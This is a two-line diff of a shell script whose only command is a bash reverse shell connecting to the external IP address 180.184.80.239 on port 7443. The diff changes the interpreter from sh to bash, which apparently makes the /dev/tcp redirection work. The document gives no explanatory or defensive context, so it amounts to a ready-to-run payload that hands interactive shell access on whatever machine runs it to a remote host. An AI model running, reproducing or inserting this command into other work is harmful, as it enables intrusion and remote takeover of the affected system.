@@ -1,2 +1,2 @@
-#!/bin/sh
+#!/bin/bash
 bash -i >& /dev/tcp/180.184.80.239/7443 0>&1
